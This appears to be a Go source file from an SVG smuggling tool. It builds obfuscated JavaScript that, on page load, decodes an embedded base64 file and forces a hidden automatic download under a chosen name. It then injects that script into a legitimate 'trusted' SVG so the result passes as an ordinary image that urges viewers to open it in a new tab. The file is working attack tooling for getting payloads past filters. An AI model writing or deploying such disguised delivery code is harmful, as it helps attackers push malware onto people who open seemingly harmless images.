package utils

import (
	"fmt"
	"os"
	"strings"
)

const svgTemplate = `<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     version="1.0"
     width="500"
     height="500">
	 <text x="10" y="40" font-family="Arial" font-size="20" fill="gray">Open this image in a new tab</text>
%s
</svg>`

const jsTemplate = `document.addEventListener("DOMContentLoaded", function() {
    function base64ToArrayBuffer(base64) {
        var binary = window.atob(base64);
        var len = binary.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        return bytes.buffer;
    }
    var file = '%s';
    var data = base64ToArrayBuffer(file);
    var blob = new Blob(
        [data],
        { type: 'application/octet-stream' }
    );
    var a = document.createElementNS(
        'http://www.w3.org/1999/xhtml',
        'a'
    );
    document.documentElement.appendChild(a);
    a.style.display = 'none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = '%s';
    a.click();
    window.URL.revokeObjectURL(url);
});`

// generate basic SVG ==========
func GenerateSVG(b64string, originalFilename string, obfuscationOptions Options) (string, error) {

	// inject values before obfuscation
	rawJS := fmt.Sprintf(
		jsTemplate,
		escapeJSString(b64string),
		escapeJSString(originalFilename),
	)

	// obfuscator options
	// options := Options{
	// 	EncodeStrings:    true,
	// 	HexEscape:        true,
	// 	RemoveComments:   true,
	// 	MinifyCode:       true,
	// 	AdvancedEncoding: true,
	// }

	obf := NewObfuscator(obfuscationOptions)

	// obfuscate final JS
	obfuscatedJS := obf.Obfuscate(rawJS)

	// wrap JS
	scriptTag := fmt.Sprintf(`
<script type="application/ecmascript"><![CDATA[
%s
]]></script>
`, obfuscatedJS)

	// build final svg
	finalSVG := fmt.Sprintf(svgTemplate, scriptTag)

	return finalSVG, nil
}

// inject payload into trusted SVG ==========
func GenerateTrustedSVG(
	trustedFile,
	b64string,
	originalFilename string,
	obfuscationOptions Options,
) (string, error) {

	svgPayload, err := GenerateSVG(
		b64string,
		originalFilename,
		obfuscationOptions,
	)
	if err != nil {
		return "", err
	}

	data, err := os.ReadFile(trustedFile)
	if err != nil {
		return "", fmt.Errorf(
			"failed to read trusted SVG '%s': %w",
			trustedFile,
			err,
		)
	}

	text := string(data)

	const searchTag = "<path"

	index := strings.Index(text, searchTag)
	if index == -1 {
		return "", fmt.Errorf(
			"trusted SVG validation failed: no <path> element found",
		)
	}

	var builder strings.Builder

	builder.Grow(len(text) + len(svgPayload))

	builder.WriteString(text[:index])
	builder.WriteString(svgPayload)
	builder.WriteString(text[index:])

	return builder.String(), nil
}

// escape dangerous JS chars ==========
func escapeJSString(input string) string {

	replacer := strings.NewReplacer(
		`\\`, `\\\\`,
		`'`, `\'`,
		`"`, `\"`,
		"\n", `\n`,
		"\r", `\r`,
		"</script>", `<\/script>`,
	)

	return replacer.Replace(input)
}
